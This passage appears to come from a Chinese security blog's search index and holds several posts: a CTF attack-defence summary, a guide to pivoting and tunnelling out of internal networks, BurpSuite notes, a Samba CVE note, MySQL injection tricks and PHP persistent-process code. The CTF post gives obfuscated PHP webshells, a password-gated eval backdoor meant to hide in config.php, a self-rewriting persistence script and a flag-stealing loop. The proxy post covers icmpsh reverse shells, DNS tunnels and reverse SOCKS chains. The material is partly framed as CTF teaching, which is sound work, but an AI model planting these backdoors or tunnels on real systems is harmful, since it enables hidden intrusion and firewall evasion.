整合参考：黑客游走于企业windows内网的几种姿势内网渗透——网络环境的判断]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>Web安全</tag>
        <tag>系统安全</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF线下攻防赛总结]]></title>
    <url>%2F2017%2F06%2FCTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。 一张常规的CTF线下攻防思维导图 SSH登陆两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。 tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如bak。依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个bak目录，打开发现是phpmyadmin，提示的弱口令是在这里用上。 网络拓扑首先先理清好网络拓扑关系，节点与各链路之间的关联。这个需要下一步配合，要不然不知道对手在哪就GG。示例： 主机发现如果是在同个C段，或者B段，均可以使用RouterScan进行对80端口扫描进行扫描得出，嫌麻烦的话，就用httpscan这个小巧的脚本 千万要记得扫端口，这很重要，当然这个端口扫描是建立在没有自己靶机权限的情况下。用nmap也行，自己写的脚本或者网上找的也行。 预留后门有的比赛环境，为了照顾比较菜的选手（此处举手），预留了一句话后门。将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留） 黑盒测试 防御及修复建议1.将所有的登陆口密码进行修改（炒鸡复杂）；2.将上传页面的action地址修改为*，（机智小能手！！）；3.反序列化和命令执行，就去seebug或其他的站点找补丁；4.待补充… 一句话控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。简单举例：1&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 连接方式：php?2=assert密码是1。献上我常用得一句话12345678&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e='($_REQUEST[C])';@assert($a.$b.$c.$d.$e);?&gt; 配置为?b=))99(rhC(tseuqeR+lave 123&lt;?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=连接密码:0（零） 权限维持1234567891011121314&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.demo.php'; $shell = "&lt;?php phpinfo();?&gt;"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; tips:.demo.php前面使用一个点，能很好的隐藏文件。想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:1234567&lt;?phpwhile (1) &#123; $pid=1234; @unlink('demo.php'); exec('kill -9 $pid');&#125;?&gt; 先查看进程，查看对应的pid，再执行即可。 素质低的人则会放置一个md5马，比如1234&lt;?phpif(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')@eval($_POST['cmd']);?&gt; 如果素质低的人又很猥琐，像rootrain这种就是。那就是利用header，最后综合起来就是12345678&lt;?phpecho 'hello';$test= 'flag';if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253') if (@$_SERVER['HTTP_USER_AGENT'] == 'flag')&#123; header("flag:$test");&#125;?&gt; 放进config.php效果最好，因为一般很少人去看这个。 简单的维护将uploads等文件夹使用chattr对文件底层属性进行控制。12345678910111213141516171819202122chattr命令的用法：chattr [ -RVf ] [ -v version ] [ mode ] files…最关键的是在[mode]部分，[mode]部分是由+-=和[ASacDdIijsTtu]这些字符组合的，这部分是用来控制文件的属性。+ ：在原有参数设定基础上，追加参数。- ：在原有参数设定基础上，移除参数。= ：更新为指定参数设定。A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。S：硬盘I/O同步选项，功能类似sync。a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。d：即no dump，设定文件不能成为dump程序的备份目标。i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂 载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。s：保密性地删除文件或目录，即硬盘空间被全部收回。u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。应用举例：用chattr命令防止系统中某个关键文件被修改：# chattr +i /etc/resolv.conf flag获取上面的$shell内容看个人，线下赛可以直接使用&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;之类的，只是说一个点，剩余的发挥空间由你们思考。 最好能写一个批量上传的，结合批量访问。批量访问参考PHP-定时任务或者1234567#!/bin/bashwhile truedo flag=$(curl 'http://172.16.4.42:800') curl --cookie "PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD" --data "key="$&#123;flag&#125; "http://172.16.4.42/index.php/wargame/submit" sleep 1sdone 只有想不到，没有做不到。 日志分析日志分析的用途 感知可能正在发生的攻击，从而规避存在的安全风险 应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失 记录log脚本这种脚本网上有很多。12345678910111213&lt;?phpdate_default_timezone_set('Asia/Shanghai');$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数$time = date('Y-m-d H:i:s',time()); //访问时间$logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";// log记录$fh = fopen("log.txt", "a");fwrite($fh, $logadd);fclose($fh);?&gt; 日志分析工具 LogForensics 腾讯实验室https://security.tencent.com/index.php/opensource/detail/15 北风飘然@金乌网络安全实验室http://www.freebuf.com/sectool/126698.html 网络ID为piaox的安全从业人员：http://www.freebuf.com/sectool/110644.html 网络ID：SecSkyhttp://www.freebuf.com/sectool/8982.html 网络ID：鬼魅羊羔http://www.freebuf.com/articles/web/96675.html CTF总结意义所在首先，CTF题是信息安全得基本概念，攻防技术、技巧得浓缩和提炼。通过解题，会快速掌握题目中所包含得概念和技术点，而这些知识在真实得环境中可能比较分散，难以学习，高水平得CTF都是由业内专家命题，往往凝聚着他们多年积累出来的技能。 其次，CTF题注重实际操作，并与基础理论知识相结合。每道CTF都需要实际动手才能找到答案，并且在比赛中经常要拼速度，这对攻防操作得能力会有极高的锻炼。除此之外，高质量得CTF题都没法直接使用现成工具解出，一般需要在理解基本原理的基础上，自己编写代码来求解，这个过程会加深和巩固计算机基础知识得理解。 最后，CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；有初步基础的学生，通过高质量赛题的实践练习，提升了实战能力；已经学有所成的学生，通过国际CTF大赛和国际强队比拼，开阔了视野。 不要为CTF而CTF虽然ctf涉及到的知识点面非常的全面。但是在实际应用中，在自己所选择的方向上给予不了多大的帮助。只因为CTF环境太过于理想化（当然是我水平问题，做不来大的CTF赛题），因为总有方法可以拿到flag，在实操上，遇到瓶颈，要考虑的东西就多了。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试 之 代理篇]]></title>
    <url>%2F2017%2F06%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B9%8B-%E4%BB%A3%E7%90%86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[整合个端口、代理总结，总觉得好难。慢慢来… 适用网络环境有以下几种： 服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3种可以使用SOCKS代理。 判断什么端口能出来VISTA 以下 TCP1FOR /L %i IN (1,1,65535) DO (cmd /c &quot;start /b telnet 151.101.73.147 %i&quot;) 用 TELNET 不停的连接你的 1-65535 端口, 你本地开个 TCPDUMP 就行了, 如果连通了, 就 OK 。 UDP1FOR /L %i IN (1,1,65535) DO (cmd /c &quot;start /b nslookup -port=%i rcoil.me 151.101.73.147&quot;) 这个速度慢，但是有效。 VISTA 以后 TCP 1function sT($IP,$Port) &#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint $address, $port;$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork;$Stype = [System.Net.Sockets.SocketType]::Stream;$Ptype = [System.Net.Sockets.ProtocolType]::TCP;$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;try &#123; $sock.Connect($End);[Byte[]] $Message = [char[]]&quot;w00tw00t&quot;;$Sent = $Sock.Send($Message);$sock.EndConnect($Connect)&#125; catch &#123;&#125;;$Sock.Close();&#125;;1..65535 | %&#123; sT -IP &quot;151.101.73.147&quot; -Port $_ &#125; UDP 1function sU($IP, [int]$Port)&#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint($Address, $port);$Saddrf=[System.Net.Sockets.AddressFamily]::InterNetwork;$Stype=[System.Net.Sockets.SocketType]::Dgram;$Ptype=[System.Net.Sockets.ProtocolType]::UDP;$Sock=New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;$sock.Connect($end);$Enc=[System.Text.Encoding]::ASCII;$Message = &quot;w00tw00t&quot;;$Buffer=$Enc.GetBytes($Message);$Sent=$Sock.Send($Buffer);&#125;; 1..65535 | %&#123; sU -IP &quot;151.101.73.147&quot; -Port $_ &#125; SSH隧道编辑/etc/ssh/sshd_config文件（服务器端）中：12345GatewayPorts yesPermitRootLogin yesPermitTunnel yes #Tunnel启用ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次, 就自动断开 接着重启ssh服务 参数详解：123456789-q Quiet mode. 安静模式-T Disable pseudo-tty allocation. 不占用 shell 了-N：Do not execute a remote command. 不执行远程命令，端口转发就用它了～-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。-f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。并推荐加上 -n 参数-g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。-R：远程转发-L：本地转发-D：... 端口转发12ssh -qTfnN -L port:host:hostport -l user remote_ip #正向隧道，本地访问VPS:8080就是VPS内网的22端口ssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道，用于内网穿透防火墙限制之类 举个例子1ssh -N -R 5556:192.168.2.100:5556 username@host msf监听5556端口就可以了。 正向代理12345SSH -qTfnN -D port remotehost #直接进行socks代理ssh -qTfnN -D 6080 user@theserver #在本地终端中运行 然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.-q：静默运行 远程转发(反向)12345678910第一步：sudo python -m SimpleHTTPServer 80在目标机子开启80端口服务第二步：ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS这样就把目标本地的22端口转发到了远程机器（VPS）的6666端口第三步：个人PC机器直接使用语句:ssh -p 6666 -qngfNTD 6767 内网用户@VPS这样就可以直接穿透网络，进入到内网，本地机器直接使用SOCKS5代理127.0.0.1:6767便能够直接访问到目标内网当中 ICMP隧道ICMP隧道是通过将任意数据注入发送到远程计算机的回送数据包来工作的。要判断是否能使用ICMP隧道，我们只需要关注一件事情：可以ping一个外部服务器。如果能到达外部网络，，那么很有可能可以建立一个icmp隧道。缺点是需要root/administrator权限。 icmpshvps上：1234git clone https://github.com/inquisb/icmpsh.gitapt-get install python-impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207 靶机上：1icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128 就会在vps上接到一个cmdshell。 HTTP代理abptts项目地址首先,安装好工具所需的各种py依赖库:12pip install pycrypto 加密库,整个数据加密都要靠这个pip install httplib2 生成好服务端(webshell)，-o用来指定要生成到的目录，然后把生成好的对应类型的代理脚本扔到目标网站目录中，并尝试访问该脚本，如果返回了一段类似hash的数据,说明代理端执行正常,继续进行后面的步骤即可，如下:1python abpttsfactory.py -o webshell 前面确认没有问题后,现在开始绑定端口，建立隧道，下面的意思就是把远端[目标机器]的3389端口和本地的1234端口进行绑定，-c用来指定webshell的配置文件[这里直接用默认的]，-u 指定webshell的url，关于更多选项用法，看下工具帮助就明白了，都非常简单的:1python abpttsclient.py -c webshell\config.txt -u &quot;http://www.rcoil.com/abptts.aspx&quot; -f 127.0.0.1:1234/127.0.0.1:3389 隧道建立成功后，用相应的socks代理客户端工具[proxychains,sockscap……]连接到前面已经绑定好的本地端口[1234端口]，即可访问目标内网中的资源:12mstsc 127.0.0.1:1234putty ssh root@127.0.0.1 -p 1234 -i ~/.ssh/xxx/id_rsa 如果对方的ssh只允许证书登录,加载上自己的证书即可 DNS隧道不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。 Iodine它几乎是和hans icmp隧道工具一样的工作机制，它在它们之间创建一对tun适配器和隧道数据作为DNS查询。使用手册Server端：1iodined -f -c -P password 1.1.1.1 tunneldomain.com Client端：1iodine -f -P password tunneldomain.com -r 成功连接将直接在客户端生成地址1.1.1.2。请注意，这种隧道技术的速度相当慢。最好的办法是在生成的连接上使用ssh连接：1ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080 Dnscat2Dnscat2通过建立C＆C通道递归DNS查询。此工具不需要root/administrator权限（在Windows和Linux上都可以使用）。它还支持端口转发。Server端：1ruby ./dnscat2.rb tunneldomain.com Client端：1./dnscat2 tunneldomain.com 收到Server端的连接后，可以使用windows命令查看活动会话：12345dnscat2&gt; windows0 :: main [active] dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*] 1 :: command session (debian) 2 :: sh (debian) [*] 要启动端口转发，请选择一个命令会话session -i ：12345678910dnscat2&gt; session -i 1New window created: 1New window created: 1history_size (session) =&gt; 1000This is a command session!That means you can enter a dnscat2 command such as&apos;ping&apos;! For a full list of clients, try &apos;help&apos;.command session (debian) 1&gt; 使用listen [lhost:]lport rhost:rport命令转发端口：1command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80 这将绑定靶机上的端口8080，并将所有连接转发到10.0.0.20:80。 TCP隧道shootbackshootback，是由python开发的反向TCP隧道，使得NAT或防火墙后的内网机器可以被外网访问。在800并发下消耗小于1％的CPU和8MB内存。…. SOCKS在实际渗透测试过程中，当我们成功的拿下第一台靶机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。 socks代理工具socks代理其实也可理解为一个增强版的 lcx，它在服务端监听一个服务端口，当有新的连接请求时会从socks协议中解析出访问目标的URL的目标端口，再开始执行lcx的具体功能。 网络上Socks代理工具有很多，选用的时候尽可能使用无GUI界面的工具，还有尽可能不需要安装其他依赖软件，能够支持多平台操作系统的更佳。 Earthworm工具网址：http://rootkiter.com/EarthWormEW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以正向、反向、多级级联等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。 目前已经有了最新版Termite，工具网址：http://rootkiter.com/Termite/ 官方提供的方法就已经很好了，配套的Termite更不错，Termite中，只要节点互通，就可以任意切换代理。 正向 SOCKS v5 服务器在具有公网IP时：1./ew -s ssocksd -l 1080 反弹 SOCKS v5 服务器先在一台具有公网 ip :233.233.233.233的主机A上运行以下命令：1./ew -s rcsocks -l 1080 -e 8888 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口 1./ew -s rssocks -d 233.233.233.233 -e 8888 HackTools 可通过访问=233.233.233.233:1080端口使用 rssocks 主机提供的 socks5 代理服务 二级级联环境示意图： 环境说明（一）：V1主机配有2块网卡，一块连通外网，一块10.255.11.8只能连接内网V2主机，无法访问内网其它资源。V2主机可以访问内网资源，但无法访问外网。 12345# V2执行，利用ssocksd方式启动8888端口的socks代理./ew -s ssocksd -l 8888# V1执行，将来自外部的1080端口的代理请求转发到V2的8888端口上./ew -s lcx_tran -l 1080 -f 10.255.11.3 -g 8888# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 环境说明（二）：V1主机没有公网IP，也无法访问内网资源。V2主机可以访问内网资源，但无法访问外网。 1234567# VPS执行，把来自外部的1080端口的流量转到本地的8888端口上./ew –s lcx_listen –l 1080 –e 8888# V2执行，在本地启动socks5代理并监听9999端口./ew -s ssocksd -l 9999# V1执行，把vps的8888端口和V2的9999进行绑定,即建立socks5通道./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.11.3 -g 9999# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 三级级联再提供一个“三级级联”的本地SOCKS测试用例以供参考环境示意图： 环境说明：Web server没有公网IP但可以访问外网，V2主机不能访问外网但可以被Web server主机访问，V3主机可被V2主机访问且能访问核心区域123456789# vps上执行，把来自外部的1080端口流量转到本地的8888端口上./ew -s rcsocks -l 1080 -e 8888 # Web server执行，把vps的8888端口和内网V2的9999端口绑定./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.12.2 -g 9999 # V2执行，将来自外部的7777端口和本地的9999端口进行绑定./ew -s lcx_listen -l 9999 -e 7777 # V3执行，将本地的socks连接反弹到V2的7777端口上./ew -s rssocks -d 10.255.12.2 -e 7777 # Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 数据流向: Attack(SOCKS v5) -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks 更多的内容用力戳戳瞎下面这篇文章。 内网漫游之SOCKS代理大结局这篇文章是我见过最全的SOCKS代理 参考：利用ssh端口转发实现Site-to-Site简易VPN通道利用 DNS 隧道传递数据和命令来绕过防火墙A Red Teamer’s guide to pivoting内网漫游之SOCKS代理大结局SSH如何反向代理稳定穿透内网]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>系统安全</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite]]></title>
    <url>%2F2017%2F05%2FBurpSuite%2F</url>
    <content type="text"><![CDATA[Burp Suite 是用于攻击web 应用程序的集成平台。对各个模块进行讲解,但是在写的时候，发现已经有很多的讲解了 =.=。 Proxy模块一般使用 Burp Proxy时，大体涉及的环节如下。这是一般情况下抓取HTTP协议的流程。 高级代理而在抓取HTTPS协议消息的时候，就需要安装CA证书才可以。 使用火狐浏览器，设置代理，将为所有协议使用相同代理访问http://burp,下载证书打开浏览器的证书管理器，将证书导入（多导入一次，以确认是否导入成功）。 这样就可以抓取ssl协议的消息了。 变相抓取客户端软件流量如果想要在另一个接口上进行Burp监听，假设监听菜刀上某个链接的流量。 将URL和IP地址写入Project options-&gt;Hostname Resolution将Proxy-&gt;Proxy Listeners中Binding选择All interfaces将Proxy-&gt;Proxy Listeners中Request handing选择Support....最后对本机的hosts文件进行修改127.0.0.1 www.xxx.com 通过修改hosts来达到变相抓取客户段软件流量的目的 Spider模块是一个爬虫模块。Spider 通过跟踪HTML和JavaScript以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及robots.txt文件。结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序视图。 Contro Crawler Settings check robots.txt：检测robot.txt文件。选择后Burp Spider会要求和处理robots.txt文件，提取内容链接。 Detect custom &quot;not found&quot; responese：检测自定义的’not found’响应。打开后Burp Spider会从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测自定义“not found”的响应。 ignore links to non-text content：忽略非文本内容的连接。这个选项被选中，Spider 不会请求非文本资源。使用这个选项，会减少 spidering 时间。 request the root of all directories：请求所有的根目录。如果这个选项被选中，Burp Spider 会请求所有已确认的目标范围内的 web 目录，如果在这个目标站点存在目录遍历， 这选项将是非常的有用。 make a non-parameterized request to each dynamic page：对每个动态页面进行非参数化的请求。如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出额外的站点内容和功能。 Maximum link depth：这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。 Maximum parameterized requests per URL：请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容。 其余的选项设置为默认就好了。如果特殊场景就特殊设置，如设置被动扫描、表单提交、程序登陆、爬行引擎和请求头。 Intruder模块(暴力破解) Target 用于配置目标服务器进行攻击的详细信息。 Positions 设置Payloads的插入点以及攻击类型（攻击模式）。 Payloads 设置payload，配置字典 Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Samba远程代码执行漏洞]]></title>
    <url>%2F2017%2F05%2FSamba%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Samba是在Linux和UNIX系统上实现SMB协议的一个软件。称是linux版本的eternalblue漏洞。不过相对window来说，linux还是比较安全的。详情在这：(CVE-2017-7494)分析自昨天分析出来，到今天，metasploit和VulApps都已经相续更新了rb和靶场 利用方法在各个公众号已经很多了。 复现前，建议先更新一下metasploit，建议使用aptitude进行更新 aptitude 是 Debian GNU/Linux 系统中, 非常神奇的的软件包管理器,基于大名鼎鼎的APT机制, 整合了 dselect 和 apt-get的所有功能, 并提供的更多特性,特别是在依赖关系处理上。123apt-get install aptitudeaptitude updateaptitude safe-upgrade metasploit-framework 使用docker搭建靶机环境，记得用sudo]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL偏门技巧]]></title>
    <url>%2F2017%2F05%2FMySQL%E5%81%8F%E9%97%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[记录一写MySQL的偏门技巧 group by with rollup的用法from：90 http://ourmysql.com/archives/1144 http://blog.csdn.net/lhy55040817/article/details/8015628 绕过未知字段名的技巧from:Mysql巧妙绕过未知字段名的技巧 DDCTF第五题，绕过未知字段名的技巧，这里拿本机来操作了下，思路很棒也很清晰，分享给大家。题目过滤空格和逗号，空格使用%0a，%0b，%0c，%0d，%a0，或者直接使用括号都可以绕过，逗号使用join绕过； 存放flag的字段名未知，information_schema.columns也将表名的hex过滤了，即获取不到字段名；这时可以利用联合查询，过程如下： 思想就是获取flag，让其在已知字段名下出现；1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556mysql&gt; select (select 1)a,(select 2)b,(select 3)c,(select 4)d;+---+---+---+---+| a | b | c | d |+---+---+---+---+| 1 | 2 | 3 | 4 |+---+---+---+---+1 row in set (0.00 sec)mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;+---+---+---+---+| 1 | 2 | 3 | 4 |+---+---+---+---+| 1 | 2 | 3 | 4 |+---+---+---+---+1 row in set (0.00 sec)mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user;+---+-------+----------+-------------+| 1 | 2 | 3 | 4 |+---+-------+----------+-------------+| 1 | 2 | 3 | 4 || 1 | admin | admin888 | 110@110.com || 2 | test | test123 | 119@119.com || 3 | cs | cs123 | 120@120.com |+---+-------+----------+-------------+4 rows in set (0.01 sec)mysql&gt; select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e;+-------------+| 4 |+-------------+| 4 || 110@110.com || 119@119.com || 120@120.com |+-------------+4 rows in set (0.03 sec)mysql&gt; select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e limit 1 offset 3;+-------------+| 4 |+-------------+| 120@120.com |+-------------+1 row in set (0.01 sec)mysql&gt; select * from user where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)dunion select * from user)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;+-------------+----------+----------+-------------+| id | username | password | email |+-------------+----------+----------+-------------+| 1 | admin | admin888 | 110@110.com || 120@120.com | 1 | 1 | 1 |+-------------+----------+----------+-------------+2 rows in set (0.04 sec)]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 定时任务]]></title>
    <url>%2F2017%2F05%2FPHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[写一个关于不死进程,其实也就是定时的进程，时间短那就是无限的启用着。之前有些文章也有这一些函数，但是没有备注。 ignore_user_abort() 函数属于杂项函数。ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。 语法1ignore_user_abort(setting) setting为可选项,如果设置为 true，则忽略与用户的断开，如果设置为 false，会导致脚本停止运行。如果未设置该参数，会返回当前的设置。 注释PHP 不会检测到用户是否已断开连接，直到尝试向客户机发送信息为止。 set_time_limit() 函数在PHP4，PHP5和PHP7中set_time_limit 是设置脚本最大执行时间 语法1bool set_time_limit ( int $seconds ) seconds最大的执行时间，单位为秒，默认值为30秒。如果设置为0（零），没有时间方面的限制。 file_put_contents() 函数属于Filesystem 函数，这个允许访问和操作文件系统。 file_put_contents() 函数把一个字符串写入文件中。与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。 语法1file_put_contents(file,data,mode,context) file为必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。data为可选。规定要写入文件的数据。可以是字符串、数组或数据流。mode为可选。规定如何打开/写入文件。context为可选。规定文件句柄的环境。 usleep() 函数usleep() 函数为杂项函数，作用为延迟代码执行若干微秒。 语法1usleep(microseconds) microseconds是必需填写的。以微秒计的暂停时间。 运用demo.php内容为：12345678910111213141516&lt;?phpignore_user_abort(true);set_time_limit(0);$file = &apos;demo.php&apos;;$shell = &quot;&lt;?php phpinfo();?&gt;&quot;; while (TRUE) &#123; file_put_contents($file, $shell);system(&apos;chmod 777 demo.php&apos;);usleep(50);&#125;?&gt; 这种小技巧在留后门上还是有些用的，种了多个demo.php，就可以批量获取demo.php界面内容。123456789101112&lt;?php$array = array( &quot;192.168.xxx.xxx&quot;, &quot;192.168.xxx.xxx&quot;);for($i=0;$i&lt;=1;$i++)&#123;$url = &quot;http://$array[$i]/demo.php&quot;;$contents = file_get_contents($url); echo &quot;$array[$i] &lt;br&gt;&quot;;echo &quot;$contents &lt;br&gt;&lt;br&gt;&quot;;&#125; ?&gt;]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC 2017 WriteUp]]></title>
    <url>%2F2017%2F05%2FISCC-2017%2F</url>
